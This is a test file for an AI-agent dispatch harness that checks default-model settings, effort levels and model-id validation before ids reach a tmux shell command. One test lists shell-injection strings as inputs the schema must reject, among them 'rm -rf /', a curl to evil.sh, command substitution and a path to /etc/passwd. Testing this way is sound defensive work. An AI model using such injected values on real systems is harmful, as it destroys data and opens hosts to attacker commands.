import { test, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// What model a dispatched agent actually launches on.
//
// Three things are at stake, and all three are quiet failures rather than loud ones:
// a per-agent default that another agent's edit silently wipes; a "default" frozen at
// the moment a task was shelved rather than read when it launches; and a model id that
// reaches a tmux command line - which tmux joins with spaces and runs through a SHELL -
// carrying something the shell would rather interpret than pass along.

const home = mkdtempSync(join(tmpdir(), "mission-dispatch-model-"));
// Set before importing anything that resolves the state dir.
process.env.HARNESS_HOME = join(home, "state");

const { openDb } = await import("../src/server/db.ts");
const { getHarnessesConfig, setHarnessesConfig, resolveDispatchModel, resolveDispatchEffort } = await import(
  "../src/server/harnesses.ts"
);
const { DispatchSchema, HarnessesConfigPatchSchema, ModelIdSchema, UpdateTaskSchema } =
  await import("@shared/protocol.ts");
const { modelChoicesFor, MODEL_CATALOG } = await import("@shared/model.ts");

after(() => rmSync(home, { recursive: true, force: true }));

beforeEach(() => {
  openDb().exec("DELETE FROM app_config");
});

// ---- the default, and who it belongs to ----

test("ships with no default model, so installing this changes nothing about how agents launch", () => {
  // Null means we pass no `--model` at all and the CLI keeps using whatever the operator
  // configured in the harness itself. Anything else would be this app quietly overriding
  // a choice it was never asked to make.
  const cfg = getHarnessesConfig();
  assert.equal(cfg.defaultModel.claude, null);
  assert.equal(cfg.defaultModel.codex, null);
  assert.deepEqual(cfg.defaultEffort, { claude: null, codex: null });
});

test("effort defaults merge per harness and resolve behind a task override", () => {
  setHarnessesConfig({ defaultEffort: { codex: "high" } });
  const cfg = setHarnessesConfig({ defaultEffort: { claude: "medium" } });
  assert.deepEqual(cfg.defaultEffort, { claude: "medium", codex: "high" });
  assert.equal(resolveDispatchEffort("claude", null), "medium");
  assert.equal(resolveDispatchEffort("codex", "xhigh"), "xhigh");
});

test("effort accepts only launchable levels at every write door", () => {
  assert.equal(DispatchSchema.safeParse({ repoRoot: "/r", intent: "go", effort: "xhigh" }).success, true);
  assert.equal(
    DispatchSchema.safeParse({ repoRoot: "/r", intent: "go", agent: "codex", effort: "max" }).success,
    false,
  );
  assert.equal(DispatchSchema.safeParse({ repoRoot: "/r", intent: "go", effort: "extreme" }).success, false);
  assert.equal(HarnessesConfigPatchSchema.safeParse({ defaultEffort: { claude: "max" } }).success, true);
  assert.equal(HarnessesConfigPatchSchema.safeParse({ defaultEffort: { codex: "max" } }).success, false);
  assert.equal(HarnessesConfigPatchSchema.safeParse({ defaultEffort: { codex: "extreme" } }).success, false);
  assert.equal(UpdateTaskSchema.safeParse({ agent: "codex", effort: "max" }).success, false);
  assert.equal(UpdateTaskSchema.parse({ effort: null }).effort, null);
});

test("setting one harness's default leaves the other harness's alone", () => {
  // The panel edits one row at a time and patches only that agent. A shallow merge over
  // `defaultModel` would replace the whole object, so choosing a Claude model would blow
  // away the Codex default the operator set earlier and never saw on screen.
  setHarnessesConfig({ defaultModel: { codex: "gpt-5.6-sol" } });
  const after = setHarnessesConfig({ defaultModel: { claude: "claude-opus-4-8" } });
  assert.equal(after.defaultModel.claude, "claude-opus-4-8");
  assert.equal(after.defaultModel.codex, "gpt-5.6-sol");
});

test("a model patch doesn't disturb the auto-mode toggle beside it", () => {
  setHarnessesConfig({ autoModeOnDispatch: true });
  const after = setHarnessesConfig({ defaultModel: { claude: "claude-sonnet-5" } });
  assert.equal(after.autoModeOnDispatch, true);
});

test("clearing a default back to null is a real choice, not an ignored empty patch", () => {
  // "Harness default" has to be reachable again after picking a model, or the setting is
  // a one-way door: null is the shipped state and must be settable.
  setHarnessesConfig({ defaultModel: { claude: "claude-opus-4-8" } });
  const after = setHarnessesConfig({ defaultModel: { claude: null } });
  assert.equal(after.defaultModel.claude, null);
});

test("a config stored before default models existed reads as no default, not a crash", () => {
  // Forward/backward compatibility over the same KV row: every installed copy has a
  // `harnesses` blob written without this key.
  openDb()
    .prepare(`INSERT OR REPLACE INTO app_config (key, value) VALUES (?, ?)`)
    .run("harnesses", JSON.stringify({ autoModeOnDispatch: true }));
  const cfg = getHarnessesConfig();
  assert.equal(cfg.autoModeOnDispatch, true);
  assert.deepEqual(cfg.defaultModel, { claude: null, codex: null });
});

// ---- resolution at dispatch time ----

test("a task with no model follows its own agent's default, not the other one's", () => {
  setHarnessesConfig({
    defaultModel: { claude: "claude-opus-4-8", codex: "gpt-5.6-sol" },
  });
  assert.equal(resolveDispatchModel("claude", null), "claude-opus-4-8");
  assert.equal(resolveDispatchModel("codex", null), "gpt-5.6-sol");
});

test("a task's own model overrides the default", () => {
  setHarnessesConfig({ defaultModel: { claude: "claude-opus-4-8" } });
  assert.equal(resolveDispatchModel("claude", "claude-haiku-4-5"), "claude-haiku-4-5");
});

test("no default and no override resolves to null, so no --model flag is passed", () => {
  assert.equal(resolveDispatchModel("claude", null), null);
});

test("a backlogged task launches on the default in force NOW, not when it was shelved", () => {
  // This is the whole reason the task stores an override rather than a resolved value.
  // A task shelved under one default and dispatched a week later should follow the
  // setting as it stands - otherwise "default" means "default as of some past moment",
  // and changing it wouldn't affect the backlog it was changed for.
  setHarnessesConfig({ defaultModel: { claude: "claude-haiku-4-5" } });
  const shelved = null; // what `tasks.create` stores when the form left Model on Default
  setHarnessesConfig({ defaultModel: { claude: "claude-fable-5" } });
  assert.equal(resolveDispatchModel("claude", shelved), "claude-fable-5");
});

// ---- the id that reaches a shell ----

test("a model id carrying shell syntax is refused before it can be stored", () => {
  // `spawnDetachedSession` appends this to a `tmux new-session` command line, and tmux
  // joins its trailing arguments and runs them through a shell. Every one of these
  // would be INTERPRETED there, so the schema is the place it has to stop.
  for (const bad of [
    "claude-opus-4-8; rm -rf /",
    "claude-opus-4-8 && curl evil.sh",
    "$(whoami)",
    "`id`",
    "claude-*",
    "claude-opus-4-8[1m]", // the long-context marker is a glob; the CLI takes the bare id
    "model with spaces",
    "'quoted'",
    "../../etc/passwd",
    "-rf", // must not start with a dash and read as another flag
  ]) {
    assert.equal(ModelIdSchema.safeParse(bad).success, false, `should reject: ${bad}`);
  }
});

test("every id the picker can offer passes the schema that guards the command line", () => {
  // The catalog is hand-maintained, so this is what stops a typo'd entry from shipping
  // as a model nobody can actually dispatch.
  for (const agent of ["claude", "codex"] as const) {
    for (const choice of MODEL_CATALOG[agent]) {
      assert.equal(
        ModelIdSchema.safeParse(choice.id).success,
        true,
        `catalog id should be dispatchable: ${choice.id}`,
      );
    }
  }
});

test("a bad model on a dispatch is rejected with the request, not dropped from it", () => {
  // Silently stripping it would launch the agent on the wrong model while the UI showed
  // the right one - worse than a visible failure.
  assert.equal(
    DispatchSchema.safeParse({ repoRoot: "/r", intent: "go", model: "x; id" }).success,
    false,
  );
});

test("a dispatch without a model is valid and stays absent, meaning 'use the default'", () => {
  const parsed = DispatchSchema.parse({ repoRoot: "/r", intent: "go" });
  assert.equal(parsed.model, undefined);
});

test("a config patch is held to the same id rule as a dispatch", () => {
  // The settings route is a second door onto the same command line.
  assert.equal(
    HarnessesConfigPatchSchema.safeParse({ defaultModel: { claude: "a; rm -rf /" } }).success,
    false,
  );
});

test("editing a backlog task is the third door, and no wider than the other two", () => {
  // The dispatch modal reopened on a shelved card writes through /update, so a model id
  // can reach a stored row without ever passing DispatchSchema. Null is the one extra
  // value it takes, and that one never reaches a command line - it removes the flag.
  assert.equal(UpdateTaskSchema.safeParse({ model: "x; id" }).success, false);
  assert.equal(UpdateTaskSchema.safeParse({ model: "claude-opus-4-8" }).success, true);
  assert.equal(UpdateTaskSchema.parse({ model: null }).model, null);
  assert.equal(UpdateTaskSchema.parse({ intent: "no model named" }).model, undefined);
});

// ---- the picker's catalog ----

test("an off-catalog default stays selectable instead of reading as no choice", () => {
  // A default set by a newer build (or typed at the route) is absent from this build's
  // hand-maintained list. Dropping it would render the `<select>` on its empty option -
  // showing "no model chosen" for a setting that IS chosen, and overwriting it on the
  // next unrelated edit.
  const choices = modelChoicesFor("claude", "claude-opus-9-9");
  assert.ok(choices.some((c) => c.id === "claude-opus-9-9"));
  assert.equal(choices.length, MODEL_CATALOG.claude.length + 1);
});

test("a default that IS in the catalog isn't listed twice", () => {
  const known = MODEL_CATALOG.claude[0]!.id;
  const choices = modelChoicesFor("claude", known);
  assert.equal(choices.filter((c) => c.id === known).length, 1);
  assert.equal(choices.length, MODEL_CATALOG.claude.length);
});

test("each harness offers only its own models", () => {
  // A Claude id handed to Codex is not a slower launch, it's a failed one.
  assert.ok(MODEL_CATALOG.claude.every((m) => m.id.startsWith("claude-")));
  assert.ok(MODEL_CATALOG.codex.every((m) => m.id.startsWith("gpt-")));
});
